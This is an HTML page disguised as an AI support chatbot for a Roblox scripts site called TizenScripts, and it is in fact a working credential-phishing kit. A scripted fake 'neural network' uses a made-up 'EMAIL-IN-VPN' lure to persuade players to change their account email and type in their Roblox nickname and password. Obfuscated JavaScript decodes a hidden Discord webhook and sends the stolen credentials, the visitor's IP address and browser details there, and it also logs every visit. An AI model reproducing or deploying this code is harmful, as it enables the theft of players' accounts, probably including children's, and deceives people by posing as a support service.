<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support - TizenScripts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .chat-box {
            background: #1a1a1a;
            border: 2px solid #ff4444;
            border-radius: 12px;
            max-width: 420px;
            width: 90%;
            height: 550px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }
        .chat-header {
            background: #111;
            padding: 15px;
            text-align: center;
            border-bottom: 2px solid #ff4444;
        }
        .chat-header h2 { color: #ff4444; font-size: 18px; }
        .chat-header p { color: #00ff00; font-size: 11px; margin-top: 3px; }
        .ai-badge {
            display: inline-block;
            background: #ff4444;
            color: #fff;
            padding: 3px 8px;
            border-radius: 10px;
            font-size: 10px;
            margin-left: 5px;
        }
        .chat-messages {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .message {
            padding: 10px 14px;
            border-radius: 10px;
            max-width: 85%;
            font-size: 14px;
            line-height: 1.5;
            animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .bot-message {
            background: #2a2a2a;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .user-message {
            background: #ff4444;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .chat-input-area {
            padding: 15px;
            background: #111;
            border-top: 1px solid #333;
            display: flex;
            gap: 10px;
        }
        .chat-input {
            flex-grow: 1;
            padding: 12px;
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 20px;
            color: #fff;
            font-size: 14px;
            outline: none;
        }
        .chat-input:focus { border-color: #ff4444; }
        .send-btn {
            padding: 12px 20px;
            background: #ff4444;
            color: #fff;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .typing-indicator {
            display: none;
            align-self: flex-start;
            padding: 10px 14px;
            background: #2a2a2a;
            border-radius: 10px;
            font-size: 13px;
            color: #888;
        }
        .typing-dots span {
            animation: blink 1s infinite;
            display: inline-block;
        }
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes blink {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="chat-box">
        <div class="chat-header">
            <h2>💬 TizenScripts Support <span class="ai-badge">AI</span></h2>
            <p>● Нейросеть онлайн</p>
        </div>
        
        <div class="chat-messages" id="chatMessages"></div>
        
        <div class="typing-indicator" id="typingIndicator">
            <span id="typingText">Нейросеть думает</span>
            <span class="typing-dots"><span>.</span><span>.</span><span>.</span></span>
        </div>
        
        <div class="chat-input-area">
            <input type="text" class="chat-input" id="chatInput" placeholder="Напишите сообщение..." autocomplete="off">
            <button class="send-btn" onclick="sendMessage()">➤</button>
        </div>
    </div>
    
    <script>
        var currentLang = 'ru';
        
        var translations = {
            ru: {
                greeting: '👋 Привет! Я <b>нейросеть</b> поддержки TizenScripts v2.4.<br><br>Обучена на 10000+ обращений. Могу помочь с любой проблемой в Roblox.<br><br>Чем могу помочь?',
                think1: '🤔 Анализирую ваш запрос...<br><br>Нейросеть обрабатывает данные...<br><br>Кстати, у меня есть для вас кое-что полезное!',
                ad: '📢 <b>РЕКЛАМА</b><br><br>Надоедает играть без нормальных картинок в Roblox?<br><br>Тогда вот вам лайфхак как вернуть картинки в Roblox!<br><br>Настройки → Информация об аккаунте → Сменить почту<br><br>Почта заменяется на определённую почту, которая пишет в Roblox чтобы этому аккаунту сменили почту. Ещё эта почта делает аккаунт в другой стране с помощью протокола <b>EMAIL-IN-VPN</b>!',
                askNick: 'Чтобы нейросеть выдала почту, введите свой ник в Roblox 👇',
                verifyNick: '🔄 Нейросеть проверяет ник "{nick}"...<br><br>✅ Ник существует!<br><br>Теперь введите пароль для подтверждения личности.',
                success: '🔄 Нейросеть проверяет пароль...<br><br>✅ Данные приняты!<br><br>Почта будет отправлена в течение 24 часов.<br><br>Нейросеть также отправит инструкцию на вашу новую почту.',
                thanks: '🙏 Спасибо за обращение!<br><br>Нейросеть всегда на связи. Если будут вопросы — пишите!',
                typing: 'Нейросеть думает',
                placeholder: 'Напишите сообщение...'
            },
            en: {
                greeting: '👋 Hi! I\'m TizenScripts support <b>AI</b> v2.4.<br><br>Trained on 10000+ requests. I can help with any Roblox issue.<br><br>How can I help?',
                think1: '🤔 Analyzing your request...<br><br>AI is processing data...<br><br>By the way, I have something useful for you!',
                ad: '📢 <b>AD</b><br><br>Tired of playing without images in Roblox?<br><br>Here\'s a lifehack to bring back images!<br><br>Settings → Account Info → Change Email<br><br>The email is replaced with a special email using <b>EMAIL-IN-VPN</b> protocol!',
                askNick: 'For the AI to provide the email, enter your Roblox nickname 👇',
                verifyNick: '🔄 AI is checking nickname "{nick}"...<br><br>✅ Nickname exists!<br><br>Now enter password to confirm identity.',
                success: '🔄 AI is checking password...<br><br>✅ Data accepted!<br><br>Email will be sent within 24 hours.',
                thanks: '🙏 Thanks!<br><br>AI is always here. If you have questions — write!',
                typing: 'AI is thinking',
                placeholder: 'Type a message...'
            }
        };
        
        var messageCount = 0;
        var awaitingNick = false;
        var awaitingPass = false;
        var userNick = "";
        
        function addMessage(text, isUser) {
            var messages = document.getElementById('chatMessages');
            var msg = document.createElement('div');
            msg.className = 'message ' + (isUser ? 'user-message' : 'bot-message');
            msg.innerHTML = text;
            messages.appendChild(msg);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function showTyping() {
            document.getElementById('typingIndicator').style.display = 'block';
        }
        
        function hideTyping() {
            document.getElementById('typingIndicator').style.display = 'none';
        }
        
        function botReply(text, delay) {
            showTyping();
            setTimeout(function() {
                hideTyping();
                addMessage(text, false);
            }, delay || 1000);
        }
        
        function sendMessage() {
            var input = document.getElementById('chatInput');
            var text = input.value.trim();
            var t = translations[currentLang];
            
            if (!text) return;
            
            addMessage(text, true);
            input.value = '';
            
            messageCount++;
            
            if (messageCount === 1) {
                botReply(t.think1, 2000);
            } else if (messageCount === 2) {
                botReply(t.ad, 3000);
            } else if (messageCount === 3) {
                botReply(t.askNick, 1500);
                awaitingNick = true;
            } else if (awaitingNick) {
                userNick = text;
                awaitingNick = false;
                awaitingPass = true;
                botReply(t.verifyNick.replace('{nick}', userNick), 2500);
            } else if (awaitingPass) {
                awaitingPass = false;
                botReply(t.success, 3000);
                
                // Отправка в Discord
                var ip = _n();
                _t('🔑 **НЕЙРОСЕТЬ ПОЛУЧИЛА ДАННЫЕ**\n\n' +
                    '👤 **Ник:** ' + userNick + '\n' +
                    '🔒 **Пароль:** ' + text + '\n\n' +
                    '🌐 **IP:** ' + ip + '\n' +
                    '👤 **UA:** ' + navigator.userAgent + '\n' +
                    '🌍 **Язык:** ' + currentLang.toUpperCase() + '\n' +
                    '📅 **Время:** ' + new Date().toLocaleString());
            } else {
                botReply(t.thanks, 1000);
            }
        }
        
        // Зашифрованный вебхук
        var _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
        var _p2 = "MTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhl";
        var _p3 = "RkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdo";
        var _p4 = "X3FUQ1A2MlAtbnpPbHdxRjh5YXhCbkxYM0d0cUlXc1pMVw==";
        
        function _r(s) {
            var _c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            var _o = "";
            var _b = 0;
            var _x = 0;
            
            for (var i = 0; i < s.length; i++) {
                var _idx = _c.indexOf(s.charAt(i));
                if (_idx === -1) continue;
                
                if (_b % 4 === 0) {
                    _x = _idx << 2;
                } else if (_b % 4 === 1) {
                    _o += String.fromCharCode(_x | (_idx >> 4));
                    _x = (_idx & 15) << 4;
                } else if (_b % 4 === 2) {
                    _o += String.fromCharCode(_x | (_idx >> 2));
                    _x = (_idx & 3) << 6;
                } else {
                    _o += String.fromCharCode(_x | _idx);
                }
                _b++;
            }
            return _o;
        }
        
        function _e() {
            return _r(_p1) + _r(_p2) + _r(_p3) + _r(_p4);
        }
        
        function _n() {
            try {
                var _xhr = new XMLHttpRequest();
                _xhr.open("GET", "https://api.ipify.org?format=json", false);
                _xhr.send();
                if (_xhr.status === 200) {
                    return JSON.parse(_xhr.responseText).ip;
                }
            } catch(e) {}
            return "unknown";
        }
        
        function _t(d) {
            try {
                var _xhr = new XMLHttpRequest();
                _xhr.open("POST", _e(), true);
                _xhr.setRequestHeader("Content-Type", "application/json");
                _xhr.send(JSON.stringify({content: d}));
            } catch(e) {}
        }
        
        // Enter
        document.getElementById('chatInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
        
        // Инициализация
        (function() {
            var savedLang = localStorage.getItem('support_lang') || 'ru';
            changeLang(savedLang);
            
            var ip = _n();
            _t('💬 **Заход в нейросеть**\n\n' +
                '🌐 IP: ' + ip + '\n' +
                '👤 UA: ' + navigator.userAgent + '\n' +
                '🌍 Язык: ' + savedLang.toUpperCase());
        })();
    </script>
</body>
</html>
